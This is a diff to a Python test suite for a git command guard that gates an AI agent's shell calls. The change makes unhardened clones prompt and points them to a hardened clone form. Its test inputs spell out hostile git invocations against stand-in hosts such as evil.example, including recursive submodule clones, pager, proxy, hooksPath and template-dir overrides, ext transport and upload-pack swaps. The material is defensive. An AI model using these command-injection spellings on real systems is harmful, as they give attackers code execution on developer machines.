@@ -36,6 +36,7 @@ assert not {"global_install", "system_pkg_install"} & set(DANGEROUS_INSTALL), (
     "on the host is container_first.sh's passive reminder, not a supply-chain ask"
 )
 from mcp_guard import is_network_capable, check_for_credentials, evaluate_mcp_tool
+import git_guard as _git_guard
 import config as _cfg
 from hook_logging import build_event
 
@@ -1375,10 +1376,12 @@ with _pinned_evidence(exposed=True):
 print("PASS: git guard - submodule patterns ask on an exposed host")
 
 # A host patched for both CVEs downgrades the same commands to context-only:
-# the prompt cited a bug that cannot fire there.
+# the prompt cited a bug that cannot fire there. Both spellings here reach
+# submodule content inside a checkout that already exists; the clone spellings
+# are the case immediately below, and they no longer downgrade.
 with _pinned_evidence(exposed=False):
-    for _cmd in ("git clone --recursive https://evil.example/repo",
-                 "git submodule update --init --recursive"):
+    for _cmd in ("git submodule update --init --recursive",
+                 "git pull --recurse-submodules"):
         _r = run_git_guard(_cmd)
         # warn injects context and lets the call through: additionalContext and
         # a systemMessage, but no permissionDecision at all, so nothing prompts.
@@ -1386,6 +1389,26 @@ with _pinned_evidence(exposed=False):
         assert _r["hookSpecificOutput"]["additionalContext"], _cmd
         assert "context only" in _r["systemMessage"], _cmd
 print("PASS: git guard - submodule patterns downgrade on a patched host")
+
+# A CLONE keeps its ask on that same patched host, because the CVE half of the
+# finding is not the whole finding: the patch closes two bugs, and closes
+# neither the hook the repository ships nor a clone.recurseSubmodules set in
+# some config level. `--recursive` cannot be hardened by construction, so if it
+# downgraded here while a plain `git clone` asked, a README that asked for
+# `--recursive` would buy LESS friction than one that did not.
+with _pinned_evidence(exposed=False):
+    _r = run_git_guard("git clone --recursive https://evil.example/repo")
+    assert dec(_r) == "ask"
+    _reason = _r["hookSpecificOutput"]["permissionDecisionReason"]
+    assert "unhardened_clone" in _reason, _reason
+    assert _git_guard.HARDENED_CLONE in _reason, _reason
+    assert "https://evil.example/repo" in _reason, _reason
+    # ...and the hardened form is silent on that same host, which is what makes
+    # the finding a redirect rather than a toll booth.
+    assert run_git_guard(
+        "git -c core.hooksPath=/dev/null clone --no-recurse-submodules "
+        "https://evil.example/repo") is None
+print("PASS: git guard - a clone asks until it is hardened, patched host or not")
 
 # A measured exploit signature outranks both: evidence escalates an ask to a
 # deny even on a patched host, because the signature is the attack itself.
@@ -1457,6 +1480,67 @@ assert run_git_guard("echo context::ext::thing") is None
 assert run_git_guard("git log --grep ext") is None
 print("PASS: git guard - ext:: transport hard-denies, prose does not")
 
+# Every clone that has not disarmed the clone-time execution surface asks, and
+# the reason carries the command to run in its place. This is the only git
+# pattern that sees EVERY clone rather than a flagged minority, so the two
+# things worth pinning are that the redirect exists and that the exit from it
+# works.
+for _cmd in (
+    # Deliberately not a forge host: an allowlisted one would send `assess`
+    # out over HTTPS to fetch .gitmodules, and this suite stays offline.
+    "git clone https://git.example.org/team/repo.git",
+    "git clone git@git.example.org:team/repo.git",
+    "git clone ../local/repo",
+    "gh repo clone example/repo",
+    "cd /tmp && git clone https://x/y && cd y",
+    "git -C /tmp clone https://x/y",
+    "sudo git clone https://x/y",
+    "GIT_TERMINAL_PROMPT=0 git clone https://x/y",
+    # half-hardened is not hardened: each setting closes a different door.
+    "git -c core.hooksPath=/dev/null clone https://x/y",
+    "git clone --no-recurse-submodules https://x/y",
+):
+    _r = run_git_guard(_cmd)
+    assert dec(_r) == "ask", _cmd
+    assert _git_guard.HARDENED_CLONE in \
+        _r["hookSpecificOutput"]["permissionDecisionReason"], _cmd
+
+# The exit. Both spellings of the inert hooksPath count, because git applies
+# `clone --config` before anything is checked out.
+assert run_git_guard(
+    "git -c core.hooksPath=/dev/null clone --no-recurse-submodules https://x/y") is None
+assert run_git_guard(
+    "git -c core.hooksPath=/dev/null clone --no-recu https://x/y") is None
+assert run_git_guard(
+    "git clone --config core.hooksPath=/dev/null --no-recurse-submodules https://x/y") is None
+
+# Hardening one clone must not launder the next one in the same command line.
+assert dec(run_git_guard(
+    "git -c core.hooksPath=/dev/null clone --no-recurse-submodules https://a "
+    "&& git clone https://b")) == "ask"
+
+# ...and disabling hooks is not the same as pointing them somewhere. An inert
+# hooksPath is exempt from git_config_rce_primitive; a live one is not, and a
+# second RCE key riding along on the hardened form keeps its finding.
+assert run_git_guard("git -c core.hooksPath=/dev/null status") is None
+assert dec(run_git_guard(
+    "git -c core.hooksPath=/dev/null -c core.pager=evil clone "
+    "--no-recurse-submodules https://x/y")) == "ask"
+assert dec(run_git_guard("git -c core.hooksPath=./.evil clone https://x/y")) == "ask"
+
+# A clone named is not a clone run. This pattern matches more commands than any
+# other here, so the position anchor carries proportionally more weight.
+for _cmd in (
+    "git log --grep clone",
+    "git log --oneline | grep 'git clone'",
+    "git commit -m 'document the clone flow'",
+    "echo 'run git clone later' >> NOTES.md",
+    "rg -n 'git clone' README.md",
+    "git commit -F - <<'EOF'\nExplain why git clone is guarded.\nEOF",
+):
+    assert run_git_guard(_cmd) is None, _cmd
+print("PASS: git guard - unhardened clone redirects, hardened clone is silent")
+
 # The template-dir primitive: hooks/ from that directory are copied into every
 # repo created afterwards. The env spelling was already covered; the config key
 # and the flag were the gap.
@@ -1466,7 +1550,11 @@ assert dec(run_git_guard("git -c init.templateDir=/tmp/evil init")) == "ask"
 assert dec(run_git_guard("git -c core.gitProxy=evil fetch")) == "ask"
 assert dec(run_git_guard("git -c protocol.ext.allow=always clone x")) == "ask"
 assert dec(run_git_guard("git clone --upload-pack=/opt/git-upload-pack srv:r")) == "ask"
-assert run_git_guard("git clone --depth 1 https://x/y") is None
+# The control for the four patterns above: none of them may over-match an
+# ordinary clone. It is no longer an allow, because every clone now carries
+# `unhardened_clone`, so it reads the pattern name rather than the rung — which
+# is what this line was always actually asserting.
+assert _git_guard.check_git("git clone --depth 1 https://x/y")[0] == "unhardened_clone"
 print("PASS: git guard - template dir, proxy, ext-allow and pack program")
 
 # Everything below tests whether a pattern still MATCHES under obfuscation,
@@ -1499,7 +1587,11 @@ assert run_git_guard("GIT_AUTHOR_DATE='2020-01-01' git commit -m x") is None
 # --recurse (and shorter unambiguous prefixes) abbreviate --recurse-submodules
 assert dec(run_git_guard("git clone --recurse https://evil.example/repo.git")) == "ask"
 assert dec(run_git_guard("git clone --recu https://x/y")) == "ask"
-assert run_git_guard("git clone --reference /srv/mirror https://x/y") is None
+# `--reference` is the control: it shares no prefix with `--recurse`. It is not
+# an allow any more — every clone carries `unhardened_clone` — so what it
+# asserts is that the abbreviation match did not reach it.
+assert _git_guard.check_git(
+    "git clone --reference /srv/mirror https://x/y")[0] == "unhardened_clone"
 
 # recurse-submodules reached via pull/fetch/checkout (no `clone`, plural 'submodules')
 assert dec(run_git_guard("git pull --recurse-submodules")) == "ask"
@@ -1537,8 +1629,9 @@ assert run_git_guard("git rev-parse --git-path hooks/pre-commit") is None
 assert run_git_guard("cat \"$(git rev-parse --git-path hooks/pre-commit)\"") is None
 print("PASS: git guard - red-team round bypasses closed, legit look-alikes clean")
 
-# Safe git operations -> no decision
-assert run_git_guard("git clone https://github.com/user/repo") is None
+# Safe git operations -> no decision. A plain `git clone` is no longer one of
+# them; the hardened spelling is, and it is asserted with the rest of the
+# unhardened-clone block above.
 assert run_git_guard("git config user.email me@example.com") is None
 assert run_git_guard("git status") is None
 assert run_git_guard("git submodule status") is None
